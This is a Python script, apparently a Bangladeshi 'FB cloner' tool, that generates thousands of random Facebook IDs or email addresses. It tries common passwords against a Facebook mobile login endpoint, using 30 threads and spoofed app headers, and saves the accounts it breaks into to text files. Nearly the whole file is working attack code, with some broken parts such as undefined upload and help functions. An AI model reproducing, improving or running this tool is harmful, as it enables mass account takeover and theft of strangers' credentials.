# AUTHER ALIENRAZOR
# CODED 15/2022

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
G = '\033[92;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
C = '\033[1;36m'

import os

try:
    import requests
except ImportError:
    os.system("pip install requests")

try:
    import concurrent.futures
except ImportError:
    os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E',
                                                                                                                    '4').replace(
    'M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        try:
            #	plr = requests.get('https')
            #	if basesplit in plr:

            key = ("\033[0;96m FREE,")
            stat = ("\033[0;91mPREMIUM")
            FG = '\033[0;90m'
            FG = '\033[0;90m'
            GET = '\033[0;92m [P] GET PREMIUM'
        except requests.exceptions.ConnectionError:
            print("\n%s [!] NO INTERNET CONNECTION..\n" % (G))
            exit()
        os.system("clear")

        print("""======================================================
\033[1;92m  ██████  ███████  █████   ███    ███  █████
\033[1;93m ██    ██ ██      ██   ██  ██ ████ ██ ██   ██
\033[1;94m ██    ██ ███████ ███████  ██ ████ ██ ███████
\033[1;95m ██    ██      ██ ██   ██  ██  ██  ██ ██   ██
\033[1;96m   ████   ███████ ██   ██  ██      ██ ██   ██                                                                                                                                      
=======================================================                       
\033[1;93m══════════════════════════════════════════════════
\033[0;96m [\033[0;96m✯\033[1;96m] \033[0;96mFB GROUP : OSᗩᗰᗩ-ZᗩᗰZᗩᗰ
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mGITHUB   : LIBYA-1982
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWARNING  : AQA
\033[1;93m══════════════════════════════════════════════════
    """)
        print("%s [%s•%s] %sTOOL NAME : %sOSᗩᗰᗩ PRO CLONER" % (R, C, R, C, G))
        print("%s [%s•%s] %sVERSION   : %s2.0" % (R, C, R, C, G))
        print("%s [%s•%s] %sGOUR KEG  : %s%s" % (R, C, R, C, G, key))
        print("%s [%s•%s] %sSTATUS    : %s" % (R, C, R, G, stat))
        print("")
        print("%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(PRO)" % (R, C, R, C, G))
        print("%s [%s2%s]%s CRACK RANDOM FB ID 2011-13 %s(PRO)" % (R, C, R, C, G))
        print("%s [%s3%s]%s CRACK RANDOM FB ID 2008-11 %s(PRO)" % (R, C, R, C, G))
        print("%s [%s4%s]%s CRACK RANDOM FB ID 2009    %s(PRO)" % (R, C, R, C, G))
        print("%s [%s5%s]%s CRACK RANDOM FB ID 2005-7 %s(PRO) V1" % (R, C, R, C, G))
        print("%s [%s6%s]%s CRACK RANDOM FB ID 2004-6 %s(PRO) V2" % (R, C, R, C, G))
        print("%s [%s7%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V3" % (R, C, R, C, G))
        print("%s [%s8%s]%s CRACK RANDOM FB ID 2003-4 %s(Maintenance Break) V3" % (R, C, R, C, G))
        print("%s [%s9%s]%s CRACK FROM EMAILS %s(PRO)" % (R, C, R, C, G))
        print(GET)
        Alien = input("\n%s [?] CHOICE : " % (C))
        if Alien in ["", " "]:
            Main()
        if Alien in ["1", "01"]:
            self.Alien1()
        if Alien in ["2", "02"]:
            self.Alien2()
        if Alien in ["3", "03"]:
            self.Alien3()
        if Alien in ["4", "04"]:
            self.Alien4()
        if Alien in ["5", "05"]:
            self.Alien5()
        if Alien in ["6", "06"]:
            self.Alien6()
        if Alien in ["7", "07"]:
            self.Alien7()
        if Alien in ["8", "08"]:
            self.Alien8()
        if Alien in ["9", "09"]:
            self.Alien9()
        if Alien in ["10", "১০"]:
            self.Alien10()
        if Alien in ["P", "p"]:
            exit()
            print(" Select Correctly ")
            time.sleep(1)
        else:
            Main()

    def Alien3(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 50000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, G, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien4(self):
        x = 1111111
        xx = 9999999
        # idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(G,G))
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 50000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien5(self):
        x = 11111111
        xx = 99999999
        # idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(G,G))
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
        if (limit) > 10000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien6(self):
        x = 1111111
        xx = 9999999
        # idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(G,G))
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
        if (limit) > 10000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien7(self):
        x = 111111
        xx = 999999
        # idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(G,G))
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
        if (limit) > 10000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien1(self):
        x = 1111111111111
        xx = 9999999999999
        idx = "50000"
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 10000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien8(self):
        x = 1111111111111
        xx = 9999999999999
        idx = "1000"
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 50000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def email(self):
        x = 111
        xx = 999
        nam = input("%s [?] TGPE A NAME %s(EX: Abir): " % (G, G))
        nam = nam.replace(" ", "")
        print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC" % (G, G))
        idx = input("%s DOMAIN  : " % (C))
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 50000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                ___ = nam
                self.id.append(___ + str(_) + __)
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, C, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input(" [?] ENTER PASSWORD : ")
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULT SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def Alien2(self):
        x = 11111111
        xx = 99999999
        idx = " 1000000"
        idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
        if (limit) > 50000:
            exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)" % (R))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;96m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR " % (G, G, G, G))
                print("%s EXAMPLE : %s123456,1234567,123456789" % (G, G))
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, G))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;96m]" % (G, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (C))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n%s [#] CRACK COMPLETE..." % (G))
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        ua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
            "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
        ])
        sys.stdout.write(
            "\r\r %s[>_] [OSᗩᗰᗩ] : %s/%s -> \033[0;92m [ OSᗩᗰᗩ-OK:%s ]- \033[0;91m[OSᗩᗰᗩ-CP:%s ]" % (
            C, self.loop, len(self.id), len(self.ok), len(self.cp))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[OSᗩᗰᗩ-OK] %s|%s\033[0;97m         " % (uid, pw))
                self.ok.append("%s|%s" % (uid, pw))
                open("ok.txt", "a").write(" [OSᗩᗰᗩ-OK] %s|%s\n" % (uid, pw))
                uploadoks()
                break
            if "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;91m[OSᗩᗰᗩ-CP] %s|%s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("cp.txt", "a").write(" [OSᗩᗰᗩ-CP] %s|%s\n" % (uid, pw))
                uploadcps()
                break
            else:
                continue

        self.loop += 1


if len(sys.argv) == 2:
    if sys.argv[1] == "--help" or sys.argv[1] == "-h":
        helpnote()
    else:
        Main()

try:
    Main()
except Exception as e:
    exit(str(e))